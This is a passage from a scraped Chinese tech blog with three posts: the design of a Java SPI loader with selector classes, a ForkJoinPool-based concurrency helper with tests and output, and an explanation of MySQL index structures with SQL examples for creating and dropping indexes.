@SpiConf(name = \"consoleEcho\") public void echo(String name, String content) { System.out.println(\"console echo:----&gt;\" + content); } /** * 实际的优先级取 方法 和类上的最高优先级, 实际为1； * `ParamsSelector`选择器时， 执行该方法的条件等同于 `{\"code\", \"type:console\"}` * @param context * @param content */ @Override @SpiConf(params = {\"type:console\"}, order = 3) public void write(Context context, String content) { System.out.println(\"console write:----&gt;\" + content); }} 在设计中，遵循下面几个原则： 类上的SpiConf注解， 默认适用与类中的所有方法 方法上有SpiConf注解，采取下面的规则 方法注解声明name时，两个会同时生效，即想调用上面的echo方法， 通过传入 ConsoleCode（类注解不显示赋值时，采用类名代替） 和 consoleEcho 等价 方法注解未声明name时，只能通过类注解上定义的name（or默认的类名）来选择 order，取最高优先级，如上面的 write 方法的优先级是 1; 当未显示定义order时，以定义的为准 params: 取并集，即要求类上 + 方法上的条件都满足 SPI加载器 spi加载器的主要业务逻辑集中在 SpiLoader 类中，包含通过spi接口，获取所有的实现类； 获取spi接口对应的选择器 （包括类对应的选择器， 方法对应的选择器）； 返回Spi接口实现类（静态确认的实现类，自适应的代理类） 从上面的简述，基本上可以看出这个类划分为三个功能点， 下面将逐一说明，本篇博文主要集中在逻辑的设计层，至于优化（如懒加载，缓存优化等） 放置下一篇博文单独叙述 1. 加载spi实现类 这一块比较简单，我们直接利用了jdk的 ServiceLoader 来根据接口，获取所有的实现类；因此我们的spi实现，需要满足jdk定义的这一套规范 具体的代码业务逻辑非常简单，大致流程如下 1234567891011121314151617 if (null == spiInterfaceType) { throw new IllegalArgumentException(\"common cannot be null...\");}if (!spiInterfaceType.isInterface()) { throw new IllegalArgumentException(\"common class:\" + spiInterfaceType + \" must be interface!\");}if (!withSpiAnnotation(spiInterfaceType)) { throw new IllegalArgumentException(\"common class:\" + spiInterfaceType + \" must have the annotation of @Spi\");} ServiceLoader&lt;T&gt; serviceLoader = ServiceLoader.load(spiInterfaceType);for(T spiImpl: serviceLoader) { // xxx} 注意 因为使用了jdk的标准，因此每定义一个spi接口，必须在 META_INF.services 下新建一个文件， 文件名为包含包路径的spi接口名， 内部为包含包路径的实现类名 每个spi接口，要求必须有 @Spi 注解 Spi接口必须是 interface 类型， 不支持抽象类和类的方式 拓展虽然这里直接使用了spi的规范，我们其实完全可以自己定义标准的，只要能将这个接口的所有实现类找到， 怎么实现都可以由你定义 如使用spring框架后，可以考虑通过 applicationContext.getBeansOfAnnotaion(xxx ) 来获取所有的特定注解的bean，这样就可以不需要自己新建一个文件，来存储spi接口和其实现类的映射关系了 构建spi实现的关系表上面获取了spi实现类，显然我们的目标并不局限于简单的获取实现类，在获取实现类之后，还需要解析其中的 @SpiConf 注解信息，用于表示要选择这个实现，必须满足什么样的条件 SpiImplWrapper : spi实现类，以及定义的各种条件的封装类 注解的解析过程流程如下: name: 注解定义时，采用定义的值； 否则采用简单类名 （因此一个系统中不允许两个实现类同名的情况） order： 优先级， 注解定义时，采用定义的值；未定义时采用默认； params: 参数约束条件， 会取类上和方法上的并集（原则上要求类上的约束和方法上的约束不能冲突） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152List&lt;SpiImplWrapper&lt;T&gt;&gt; spiServiceList = new ArrayList&lt;&gt;();// 解析注解spiConf = t.getClass().getAnnotation(SpiConf.class); Map&lt;String, String&gt; map; if (spiConf == null) { // 没有添加注解时， 采用默认的方案 implName = t.getClass().getSimpleName(); implOrder = SpiImplWrapper.DEFAULT_ORDER; // 参数选择器时, 要求spi实现类必须有 @SpiConf 注解, 否则选择器无法获取校验条件参数 if (currentSelector.getSelector() instanceof ParamsSelector) { throw new IllegalStateException(\"spiImpl must contain annotation @SpiConf!\"); } map = Collections.emptyMap(); } else { implName = spiConf.name(); if (StringUtils.isBlank(implName)) { implName = t.getClass().getSimpleName(); } implOrder = spiConf.order() &lt; 0 ? SpiImplWrapper.DEFAULT_ORDER : spiConf.order(); map = parseParms(spiConf.params()); } // 添加一个类级别的封装类 spiServiceList.add(new SpiImplWrapper&lt;&gt;(t, implOrder, implName, map)); // ------------ // 解析参数的方法 private Map&lt;String, String&gt; parseParms(String[] params) { if (params.length == 0) { return Collections.emptyMap(); } Map&lt;String, String&gt; map = new HashMap&lt;&gt;(params.length); String[] strs; for (String param : params) { strs = StringUtils.split(param, \":\"); if (strs.length &gt;= 2) { map.put(strs[0].trim(), strs[1].trim()); } else if (strs.length == 1) { map.put(strs[0].trim(), null); } } return map; } 2. 初始化选择器 我们的选择器会区分为两类，一个是类上定义的选择器， 一个是方法上定义的选择器； 在自适应的使用方式中，方法上定义的优先级 &gt; 类上定义 简单来讲，初始化选择器，就是扫一遍SPI接口中的注解，实例化选择器后，缓存住对应的结果, 实现如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071 /*** 选择器, 根据条件, 选择具体的 SpiImpl;*/private SelectorWrapper currentSelector;/*** 自适应时, 方法对应的选择器*/private Map&lt;String, SelectorWrapper&gt; currentMethodSelector;/*** 每一个 SpiLoader 中, 每种类型的选择器, 只保存一个实例* 因此可以在选择器中, 如{@link ParamsSelector} 对spiImplMap进行处理并缓存结果*/private ConcurrentHashMap&lt;Class, SelectorWrapper&gt; selectorInstanceCacheMap = new ConcurrentHashMap&lt;&gt;(); private void initSelector() { Spi ano = spiInterfaceType.getAnnotation(Spi.class); if (ano == null) { currentSelector = initSelector(DefaultSelector.class); } else { currentSelector = initSelector(ano.selector()); } Method[] methods = this.spiInterfaceType.getMethods(); currentMethodSelector = new ConcurrentHashMap&lt;&gt;(); SelectorWrapper temp; for (Method method : methods) { if (!method.isAnnotationPresent(SpiAdaptive.class)) { continue; } temp = initSelector(method.getAnnotation(SpiAdaptive.class).selector()); if (temp == null) { continue; } currentMethodSelector.put(method.getName(), temp); }}private SelectorWrapper initSelector(Class&lt;? extends ISelector&gt; clz) { // 优先从选择器缓存中获取类型对应的选择器 if (selectorInstanceCacheMap.containsKey(clz)) { return selectorInstanceCacheMap.get(clz); } try { ISelector selector = clz.newInstance(); Class paramClz = null; Type[] types = clz.getGenericInterfaces(); for (Type t : types) { if (t instanceof ParameterizedType) { paramClz = (Class) ((ParameterizedType) t).getActualTypeArguments()[0]; break; } } Assert.check(paramClz != null); SelectorWrapper wrapper = new SelectorWrapper(selector, paramClz); selectorInstanceCacheMap.putIfAbsent(clz, wrapper); return wrapper; } catch (Exception e) { throw new IllegalArgumentException(\"illegal selector defined! yous:\" + clz); }} 说明 SeectorWrapper 选择器封装类 这里我们在获取选择器时，特意定义了一个封装类，其中包含具体的选择器对象，以及所匹配的参数类型，因此可以在下一步通过选择器获取实现类时，保证传入的参数类型合法 private SelectorWrapper initSelector(Class&lt;? extends ISelector&gt; clz) 具体的实例化选择器的方法 从实现来看，优先从选择器缓存中获取选择器对象，这样的目的是保证一个spi接口，每种类型的选择器只有一个实例；因此在自定义选择器中，你完全可以做一些选择判断的缓存逻辑，如 ParamsSelector 中的spi实现类的有序缓存列表 currentSelector , currentMethodSelector, selectorInstanceCacheMap currentSelector: 对应的是类选择器，每个SPI接口必然会有一个，作为打底的选择器 currentMethodSelector: 方法选择器映射关系表，key为方法名，value为该方法对应的选择器； 所以spi接口中，不支持重载 selectorInstanceCacheMap: spi接口所有定义的选择器映射关系表，key为选择器类型，value是实例；用于保障每个spi接口中选择器只会有一个实例 3. 获取实现类 对使用者而言，最关注的就是这个接口，这里会返回我们需要的实现类（or代理）；内部的逻辑也比较清楚，首先确定选择器，然后通过选择器便利所有的实现类，把满足条件的返回即可 从上面的描述可以看到，主要分为两步 获取选择器 根据选择器，遍历所有的实现类，找出匹配的返回 获取选择器初始化选择器之后，我们会有 currentSelector , currentMethodSelector 两个缓存 静态确定spi实现时，直接用 currentSelector 即可 （spi接口中所有方法都公用类定义选择器） 动态适配时， 根据方法名在 currentMethodSelector 中获取选择器，如果没有，则表示该方法没有@SpiAdaptive注解，直接使用类的选择器 currentMethodSelector 即可 123456789101112131415// 动态适配时，获取方法对应对应的selector实现逻辑SelectorWrapper selector = currentMethodSelector.get(methodName);if (selector == null) { // 自适应方法上未定义选择器, 则默认继承类的 selector = currentSelector; currentMethodSelector.putIfAbsent(methodName, selector);}if (!selector.getConditionType().isAssignableFrom(conf.getClass())) { // 选择器类型校验 if (!(conf instanceof String)) { throw new IllegalArgumentException(\"conf spiInterfaceType should be sub class of [\" + currentSelector.getConditionType() + \"] but yours:\" + conf.getClass()); } // 参数不匹配时，且传入的参数为String类型， 则尝试使用默认选择器进行兼容（不建议在实现时，出现这种场景） selector = DEFAULT_SELECTOR;} 选择实现类这个的主要逻辑就是遍历所有的实现类，判断是否满足选择器的条件，将第一个找到的返回即可，所有的业务逻辑都在 ISelector 中实现，如下面给出的默认选择器，根据name来获取实现类 1234567891011121314151617181920212223242526/** * 默认的根据name 获取具体的实现类 * &lt;p/&gt; * Created by yihui on 2017/5/24. */public class DefaultSelector implements ISelector&lt;String&gt; { @Override public &lt;K&gt; K selector(Map&lt;String, SpiImplWrapper&lt;K&gt;&gt; map, String name) throws NoSpiMatchException { if (StringUtils.isBlank(name)) { throw new IllegalArgumentException(\"spiName should not be empty!\"); } if (map == null || map.size() == 0) { throw new IllegalArgumentException(\"no impl spi!\"); } if (!map.containsKey(name)) { throw new NoSpiMatchException(\"no spiImpl match the name you choose! your choose is: \" + name); } return map.get(name).getSpiImpl(); }} 流程说明 上面主要就各个点单独的进行了说明，看起来可能比较分散，看完之后可能没有一个清晰的流程，这里就整个实现的流程顺一遍，主要从使用者的角度出发，当定义了一个SPI接口后，到获取spi实现的过程中，上面的这些步骤是怎样串在一起的 流程图先拿简单的静态获取SPI实现流程说明（动态的其实差不多，具体的差异下一篇说明），先看下这种用法的使用姿势 1234567891011121314151617181920212223242526@Spipublic interface IPrint { void print(String str);}public class FilePrint implements IPrint { @Override public void print(String str) { System.out.println(\"file print: \" + str); }}public class ConsolePrint implements IPrint { @Override public void print(String str) { System.out.println(\"console print: \" + str); }}@Testpublic void testPrint() throws NoSpiMatchException { SpiLoader&lt;IPrint&gt; spiLoader = SpiLoader.load(IPrint.class); IPrint print = spiLoader.getService(\"ConsolePrint\"); print.print(\"console----&gt;\");} SpiLoader&lt;IPrint&gt; spiLoader = SpiLoader.load(IPrint.class);这行代码触发的action 主要是初始化所有的选择器, 如下图 首先从缓存中查 是否已经初始化过了有则直接返回； 缓存中没有，则进入new一个新的对象出来 解析类上注解 @Spi，初始化 currentSelector 解析所有方法的注解 @SpiAdaptive ， 初始化 currentMethodSelector 塞入缓存，并返回 IPrint print = spiLoader.getService(&quot;ConsolePrint&quot;);根据name获取实现类，具体流程如下 判断是否加载过所有实现类 spiImplClassCacheMap 没有加载，则重新加载所有的实现类 通过jdk的 ServiceLoader.load() 方法获取所有的实现类 遍历实现类，根据 @SpiConf 注解初始化参数，封装 SpiImplWrapper对象 保存封装的 SpiImplWrapper对象到缓存 执行 currentSelector.select() 方法，获取匹配的实现类 其他博客系列链接： SPI框架实现之旅四：使用测试 SPI框架实现之旅三：实现说明 SPI框架实现之旅二：整体设计 SPI框架实现之旅一：背景介绍 项目: QuickAlarm 项目地址： Quick-SPI 博客地址： 小灰灰Blog 个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正，我的微博地址: 小灰灰Blog 扫描关注","link":"/hexblog/2017/05/28/SPI框架实现之旅二：整体设计/"},{"title":"基于ForkJoin构建一个简单易用的并发组件","text":"基于ForkJoin构建一个简单易用的并发组件在实际的业务开发中，需要用到并发编程的知识，实际使用线程池来异步执行任务的场景并不是特别多，而且一般真的遇到了需要并发使用的时候，可能更加常见的就是直接实现Runnable/Callable接口，丢到Thread中执行了；或者更高级一点，定义一个线程池，扔进去执行；本片博文，将从另一个角度，借助JDK提供的ForkJoin，来设计一个简单易用的并发框架 I. 背景实际项目中，使用并发的一个case就是商品详情页的展示了，一个详情页的展示，除了基本的商品数据之外，还有销量，地址，评价，推荐，店铺信息，装饰信息等，用一段伪代码来描述拼装整个详情数据的过程 12345678910111213141516171819// 获取商品基本信息ItemInfo itemInfo = itemService.getInfo(itemId);// 获取销量int sellCount = sellService.getSellCount(itemId);// 获取评价信息RateInfo rateInfo = rateService.getRateInfo(itemId);// 获取店铺信息ShopInfo shopInfo = shopService.getShopInfo(shopId);// 获取装饰信息DecorateInfo decoreateInfo = decorateService.getDecorateInfo(itemId);// 获取推荐商品RecommandInfo recommandInfo = recommandService.getRecommand(itemId); 如果是正常的执行过程，那么就是上面的6个调用，串行的执行下来，假设每个服务的rt是10ms，那么光是这里六个服务执行下来，耗时就&gt;60ms了， 但从业务角度出发，上面6个服务调用，彼此之间没有什么关联，即一个服务的调用，并不依赖另一个服务返回的结果，她们完全可以并发执行，这样六个服务执行下来，耗时就是六个服务中耗时最久的一个了，可能也就10ms多一点了 两个一对比，发现这种场景下，使用并发的优势非常明显了，接下来的问题是，我们希望以最简单的方式，将上面的代码改成并发的 II. 设计与实现以上面的case为例，如果我们采用线程池的方式，可以怎么实现呢？ 1. 线程池方式因为线程池方式不是重点，所以就简单的演示以下，可以怎么实现，以及实现之后的效果如何 123456789101112131415161718192021// 1. 创建线程池ExecutorService alarmExecutorService = new ThreadPoolExecutor(3, 5, 60, TimeUnit.SECONDS, new LinkedBlockingDeque&lt;&gt;(10), new DefaultThreadFactory(\"service-pool\"), new ThreadPoolExecutor.CallerRunsPolicy());// 2. 将服务调用，封装到线程任务中执行Future&lt;ItemInfo&gt; itemFuture = alarmExecutorService.submit(new Callable&lt;ItemInfo&gt;() { @Override public ItemInfo call() throws Exception { return itemService.getInfo(itemId); }});// ... 其他的服务依次类推// 3. 获取数据ItemInfo = itemFutre.get(); // 阻塞，直到返回 上面这个实现可以说是一个非常清晰明了的实现方式了，我们接下来看一下，用Fork/Join框架可以怎么玩，又会有什么好处 2. ForkJoin方式首先可能需要简单的介绍下，这是个什么东西，Fork/Join框架是Java7提供了的一个用于并行执行任务的框架，是一个把大任务分割成若干个小任务，最终汇总每个小任务结果后得到大任务结果的框架 简单来说，就是讲一个复杂的任务，拆分成很多小任务，并发去执行的机制，任务与任务的执行，可能并不会独占线程，采用了一种名为工作窃取的手段，详情可以参考 ForkJoin 学习使用笔记 借助ForkJoin的方式，又可以怎么支持上面的场景呢？一个简单的方案如下 1234567891011121314// 1. 创建池ForkJoinPool pool = new ForkJoinPool(10);// 2. 创建任务并提交ForkJoinTask&lt;ItemInfo&gt; future = joinPool.submit(new RecursiveTask&lt;ItemInfo&gt;() { public ItemInfo compute() { return itemService.getItemInfo(itemId); }});// 3. 获取结果future.join(); 这样一对比，两者之间并没有什么区别，而且也没有用到传说中的任务拆解 3. 进阶如何能够充分的利用ForkJoin的任务拆解的思想来解决问题呢？ 将上面的实例，我们稍微变通一下，将整个详情页的数据返回，看做是一个任务，对于内部的服务调用，根据不同的应用提供放，再进行任务划分，假设可以变成如下的层次结构 从上图可以看出，前面的服务调用，还可以继续划分，比如我们常见的商品信息，就可以区分为基本商品信息，sku信息，库存信息，而这三个又是可以并发执行的，也就是说从，借助forjoin的任务拆解，我们完全可以做到更细粒度的并发场景 那么现在的目标就是，如何实现上面这个任务拆分的场景需求，而且还希望对既有的代码改动不太大，关键还在于写出来后，得容易看懂+维护（这点其实很重要，笔者接触过一个封装得特别好，导致业务交接的维护成本太大，以及排查问题难度飙升的情况） 4. 实现a. 设计思路首先是定义一个最基本的执行单元，也就是封装具体的业务逻辑，也就是我们常说的Task（最终的效果也就是一个一个的task进行执行任务） 因为考虑到任务的拆解的情况，所以我们需要一个特殊的task，这个task可以是多个task的集合（也就是大任务，先称为bigTask） 然后就是使用时，所有的task都封装在一个bigTask中，直接丢给forkJoinPool来执行（支持同步获取结果的invoke调用方式和异步获取结果的execute方式） 那么，核心就在与如何设计这个BigTask了，以及在执行时，将bigTask拆解成更细粒度的bigTask或者task，并最终将所有的task执行结果合并起来并返回 b. 实现基本task接口 1234567891011121314/** * Created by yihui on 2018/4/8. */public interface IDataLoader&lt;T&gt; { /** * 具体的业务逻辑，放在这个方法里面执行，将返回的结果，封装到context内 * * @param context */ void load(T context);} 一个抽象的实现类，继承forkjoin的RecuriAction，这个就对应上我们前面定义的基本Task了 123456789101112131415161718192021222324252627public abstract class AbstractDataLoader&lt;T&gt; extends RecursiveAction implements IDataLoader { // 这里就是用来保存返回的结果，由业务防自己在实现的load()方法中写入数据 protected T context; public AbstractDataLoader(T context) { this.context = context; } public void compute() { load(context); } /** * 获取执行后的结果，强制等待执行完毕 * @return */ public T getContext() { this.join(); return context; } public void setContext(T context) { this.context = context; }} 然后就是BigTask的实现了，也比较简单，内部维持一个List 12345678910111213141516171819202122232425262728293031323334353637383940public class DefaultForkJoinDataLoader&lt;T&gt; extends AbstractDataLoader&lt;T&gt; { /** * 待执行的任务列表 */ private List&lt;AbstractDataLoader&gt; taskList; public DefaultForkJoinDataLoader(T context) { super(context); taskList = new ArrayList&lt;&gt;(); } public DefaultForkJoinDataLoader&lt;T&gt; addTask(IDataLoader dataLoader) { taskList.add(new AbstractDataLoader(this.context) { @Override public void load(Object context) { dataLoader.load(context); } }); return this; } // 注意这里，借助fork对任务进行了拆解 @Override public void load(Object context) { this.taskList.forEach(ForkJoinTask::fork); } /** * 获取执行后的结果 * @return */ public T getContext() { this.taskList.forEach(ForkJoinTask::join); return this.context; }} 接下来就是比较简单的线程池的设计了，因为我们需要提供同步获取结果，和异步获取结果的两种姿势，所以对ForkJoinPool需要做个扩展 123456789101112131415161718192021222324public class ExtendForkJoinPool extends ForkJoinPool { public ExtendForkJoinPool() { } public ExtendForkJoinPool(int parallelism) { super(parallelism); } public ExtendForkJoinPool(int parallelism, ForkJoinWorkerThreadFactory factory, Thread.UncaughtExceptionHandler handler, boolean asyncMode) { super(parallelism, factory, handler, asyncMode); } // 同步阻塞调用时，需要对每个task执行join，确保执行完毕 public &lt;T&gt; T invoke(ForkJoinTask&lt;T&gt; task) { if (task instanceof AbstractDataLoader) { super.invoke(task); return (T) ((AbstractDataLoader) task).getContext(); } else { return super.invoke(task); } }} 然后就是创建Pool的工厂类，没什么特别的了 123456789101112131415161718192021222324252627282930313233public class ForkJoinPoolFactory { private int parallelism; private ExtendForkJoinPool forkJoinPool; public ForkJoinPoolFactory() { this(Runtime.getRuntime().availableProcessors() * 16); } public ForkJoinPoolFactory(int parallelism) { this.parallelism = parallelism; forkJoinPool = new ExtendForkJoinPool(parallelism); } public ExtendForkJoinPool getObject() { return this.forkJoinPool; } public int getParallelism() { return parallelism; } public void setParallelism(int parallelism) { this.parallelism = parallelism; } public void destroy() throws Exception { this.forkJoinPool.shutdown(); }} 到此，整个基本上算是完了，每个类都很简单，就那么点东西，接下来就是需要看怎么用了 III. 测试验证先来一个简单的case，演示下，应该怎么用 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283 @Datastatic class Context { public int addAns; public int mulAns; public String concatAns; public Map&lt;String, Object&gt; ans = new ConcurrentHashMap&lt;&gt;();}@Testpublic void testForkJoinFramework() { ForkJoinPool forkJoinPool = new ForkJoinPoolFactory().getObject(); Context context = new Context(); DefaultForkJoinDataLoader&lt;Context&gt; loader = new DefaultForkJoinDataLoader&lt;&gt;(context); loader.addTask(new IDataLoader&lt;Context&gt;() { @Override public void load(Context context) { context.addAns = 100; System.out.println(\"add thread: \" + Thread.currentThread()); } }); loader.addTask(new IDataLoader&lt;Context&gt;() { @Override public void load(Context context) { try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } context.mulAns = 50; System.out.println(\"mul thread: \" + Thread.currentThread()); } }); loader.addTask(new IDataLoader&lt;Context&gt;() { @Override public void load(Context context) { context.concatAns = \"hell world\"; System.out.println(\"concat thread: \" + Thread.currentThread()); } }); DefaultForkJoinDataLoader&lt;Context&gt; subTask = new DefaultForkJoinDataLoader&lt;&gt;(context); subTask.addTask(new IDataLoader&lt;Context&gt;() { @Override public void load(Context context) { System.out.println(\"sub thread1: \" + Thread.currentThread() + \" | now: \" + System.currentTimeMillis()); try { Thread.sleep(200); } catch (InterruptedException e) { e.printStackTrace(); } context.ans.put(Thread.currentThread().getName(), System.currentTimeMillis()); } }); subTask.addTask(new IDataLoader&lt;Context&gt;() { @Override public void load(Context context) { System.out.println(\"sub thread2: \" + Thread.currentThread() + \" | now: \" + System.currentTimeMillis()); context.ans.put(Thread.currentThread().getName(), System.currentTimeMillis()); } }); loader.addTask(subTask); long start = System.currentTimeMillis(); System.out.println(\"------- start: \" + start); // 提交任务，同步阻塞调用方式 forkJoinPool.invoke(loader); System.out.println(\"------- end: \" + (System.currentTimeMillis() - start)); // 输出返回结果，要求3s后输出，所有的结果都设置完毕 System.out.println(\"the ans: \" + context);} 使用起来就比较简单了，简单的四步骤即可： 创建Pool 指定保存结果的容器类ContextHolder 创建任务 创建根任务 new DefaultForkJoinDataLoader&lt;&gt;(context); 添加子任务 提交 上面这个实现中，对于需要将Task进行再次拆分，会变得非常简单，看下上面的输出 12345678------- start: 1523200221827add thread: Thread[ForkJoinPool-1-worker-50,5,main]concat thread: Thread[ForkJoinPool-1-worker-36,5,main]sub thread2: Thread[ForkJoinPool-1-worker-29,5,main] | now: 1523200222000sub thread1: Thread[ForkJoinPool-1-worker-36,5,main] | now: 1523200222000mul thread: Thread[ForkJoinPool-1-worker-43,5,main]------- end: 3176the ans: ForJoinTest.Context(addAns=100, mulAns=50, concatAns=hell world, ans={ForkJoinPool-1-worker-36=1523200222204, ForkJoinPool-1-worker-29=1523200222000}) 首先是各个子任务执行的线程输出可以看出确实是不同线程执行的任务（并发） 3s后，输出结果，即invoke之后，会阻塞直到所有的任务执行完毕 subTask进行了任务拆解，两个子任务的执行时间相同，但是一个sleep，另一个则不受影响（子任务也是并行执行） 对于希望异步执行的情况，也比较简单了，仅仅是在提交任务的地方，稍微改动一下即可，然后在需要获取数据的时候，通过loader来获取结果即可 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849@Testpublic void testForkJoinFramework2() { ForkJoinPool forkJoinPool = new ForkJoinPoolFactory().getObject(); Context context = new Context(); DefaultForkJoinDataLoader&lt;Context&gt; loader = new DefaultForkJoinDataLoader&lt;&gt;(context); loader.addTask(new IDataLoader&lt;Context&gt;() { @Override public void load(Context context) { try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } context.addAns = 100; System.out.println(\"add thread: \" + Thread.currentThread()); } }); loader.addTask(new IDataLoader&lt;Context&gt;() { @Override public void load(Context context) { context.mulAns = 50; System.out.println(\"mul thread: \" + Thread.currentThread()); } }); loader.addTask(new IDataLoader&lt;Context&gt;() { @Override public void load(Context context) { context.concatAns = \"hell world\"; System.out.println(\"concat thread: \" + Thread.currentThread()); } }); long start = System.currentTimeMillis(); System.out.println(\"------- start: \" + start); // 如果暂时不关心返回结果，可以采用execute方式，异步执行 forkJoinPool.execute(loader); // .... 这里可以做其他的事情 此时，不会阻塞，addAns不会被设置 System.out.println(\"context is: \" + context); System.out.println(\"------- then: \" + (System.currentTimeMillis() - start)); loader.getContext(); // 主动调用这个，表示会等待所有任务执行完毕后，才继续下去 System.out.println(\"context is: \" + context); System.out.println(\"------- end: \" + (System.currentTimeMillis() - start));} IV. 其他源码相关源码可在git上查看，主要在Quick-Alarm项目中 QuickAlarm 并发相关代码 个人博客： 一灰灰Blog个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/04/09/基于ForkJoin构建一个简单易用的并发组件/"},{"title":"mysql之索引的工作机制","text":"mysql之高性能索引当db的量达到一定数量级之后，每次进行全表扫描效率就会很低，因此一个常见的方案是建立一些必要的索引作为优化手段，那么问题就来了： 那么什么是索引呢？ 索引的实现原理是怎样的？ 我们通常说的聚集索引，非聚集索引的区别是什么？ 如何创建和使用索引呢？ I. 索引介绍MySQL官方对索引的定义为：索引是帮助MySQL高效获取数据的数据结构。简而言之,索引是数据结构 1. 几种树的结构a. B+树单来说就是一种为磁盘或者其他存储设备而设计的一种平衡二叉树,在B+tree中所有记录都按照key的大小存放在叶子结点上，各叶子结点直接用指针连接 b. 二叉树二叉树的规则是父节点大于左孩子节点，小于右孩子节点 c. 平衡二叉树首先是一个二叉树，但是要求任意一个节点的左右孩子节点的高度差不大于1 d. B树首先是一个平衡二叉树，但是又要求每个叶子节点到根节点的距离相等 那么B树和B+树的区别是什么呢？ B+树的叶子节点可以包含一个指针，指向另一个叶子节点 B+树键值的拷贝存在非叶子节点；键值+记录存储在叶子节点 2. InnoDB引擎之B+树mysql的InnnoDB引擎采用的B+树，只有叶子节点存储对应的数据列，有以下好处 叶子结点通常包含较多的记录，具有较高的扇出性(可理解为每个节点对应的下层节点较多)，因此树的高度较低(3~4)，而树的高度也决定了磁盘IO的次数，从而影响了数据库的性能。一般情况下，IO次数与树的高度是一致的 对于组合索引，B+tree索引是按照索引列名(从左到右的顺序)进行顺序排序的，因此可以将随机IO转换为顺序IO提升IO效率;并且可以支持order by \\group等排序需求;适合范围查询 3. hash索引hash索引，相比较于B树而言，不需要从根节点到叶子节点的遍历，可以一次定位到位置，查询效率更高，但缺点也很明显 仅能满足”=”,”IN”和”&lt;=&gt;”查询，不能使用范围查询 因为是通过hash值进行计算，所以只能精确查询，hash值是没什么规律的，不能保证顺序和原来一致，所以范围查询不行 无法进行排序 原因同上 不支持部分索引 hash值的计算，是根据完整的几个索引列计算，如果少了其中一个乃至几个，这个hash值就没法计算了 hash碰撞 4. 聚集索引与非聚集索引a. 聚集索引InnoDB的数据文件本身就是索引文件，B+Tree的叶子节点上的data就是数据本身，key为主键，非叶子节点存放&lt;key,address&gt;，address就是下一层的地址 聚簇索引的结构图: b. 非聚集索引非聚簇索引，叶子节点上的data是主键(即聚簇索引的主键，所以聚簇索引的key，不能过长)。为什么存放的主键，而不是记录所在地址呢，理由相当简单，因为记录所在地址并不能保证一定不会变，但主键可以保证 非聚簇索引结构图： 从非聚集索引的结构上，可以看出这种场景下的定位流程： 先通过非聚集索引，定位到对应的叶子节点，找到对应的主键 根据上面找到的主键，在聚集索引中，定位到对应的叶子节点（获取数据） 5. 索引的优点 避免全表扫描（当走不到索引时，就只能一个一个的去匹配；如果走索引，则可以根据B树来定位） 使用索引可以帮助服务器避免排序或者临时表 （叶子节点上的指针，可以有效的支持范围查询；此外叶子节点本身就是根据key进行排序的） 索引将随机IO变成顺序IO 6. 适用范围索引并不是适用于任何情况。对于中型、大型表适用。对于小型表全表扫描更高效。而对于特大型表，考虑”分区”技术 II. 索引的使用原则一般我们在创建表的时候，需要指定primary key, 这样就可以确定聚集索引了，那么如何添加非聚集索引呢？ 1. 索引的几个语法创建索引 12345-- 创建索引create index `idx_img` on newuser(`img`);-- 查看show create table newuser\\G; 输出 1234567891011121314151617181920212223show create table newuser\\G*************************** 1. row *************************** Table: newuserCreate Table: CREATE TABLE `newuser` ( `userId` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '用户id', `username` varchar(30) DEFAULT '' COMMENT '用户登录名', `nickname` varchar(30) NOT NULL DEFAULT '' COMMENT '用户昵称', `password` varchar(50) DEFAULT '' COMMENT '用户登录密码 &amp; 密文根式', `address` text COMMENT '用户地址', `email` varchar(50) NOT NULL DEFAULT '' COMMENT '用户邮箱', `phone` bigint(20) NOT NULL DEFAULT '0' COMMENT '用户手机号', `img` varchar(100) DEFAULT '' COMMENT '用户头像', `extra` text, `isDeleted` tinyint(1) unsigned NOT NULL DEFAULT '0', `created` int(11) NOT NULL, `updated` int(11) NOT NULL, PRIMARY KEY (`userId`), KEY `idx_username` (`username`), KEY `idx_nickname` (`nickname`), KEY `idx_email` (`email`), KEY `idx_phone` (`phone`), KEY `idx_img` (`img`)) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 另一种常见的添加索引方式 1234alter table newuser add index `idx_extra_img`(`isDeleted`, `img`);-- 查看索引show index from newuser; 输出结果 123456789101112+---------+------------+---------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+| Table | Non_unique | Key_name | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment |+---------+------------+---------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+| newuser | 0 | PRIMARY | 1 | userId | A | 3 | NULL | NULL | | BTREE | | || newuser | 1 | idx_username | 1 | username | A | 3 | NULL | NULL | YES | BTREE | | || newuser | 1 | idx_nickname | 1 | nickname | A | 3 | NULL | NULL | | BTREE | | || newuser | 1 | idx_email | 1 | email | A | 3 | NULL | NULL | | BTREE | | || newuser | 1 | idx_phone | 1 | phone | A | 3 | NULL | NULL | | BTREE | | || newuser | 1 | idx_img | 1 | img | A | 3 | NULL | NULL | YES | BTREE | | || newuser | 1 | idx_extra_img | 1 | isDeleted | A | 3 | NULL | NULL | | BTREE | | || newuser | 1 | idx_extra_img | 2 | img | A | 3 | NULL | NULL | YES | BTREE | | |+---------+------------+---------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+ 删除索引 12345drop index `idx_extra_img` on newuser;drop index `idx_img` on newuser;-- 查看索引show index from newuser; 输出 12345678910show index from newuser;+---------+------------+--------------+--------------+-------------+-----------+-------------+----------+--------+------+------------+---------+---------------+| Table | Non_unique | Key_name | Seq_in_index | Column_name | Collation | Cardinality | Sub_part | Packed | Null | Index_type | Comment | Index_comment 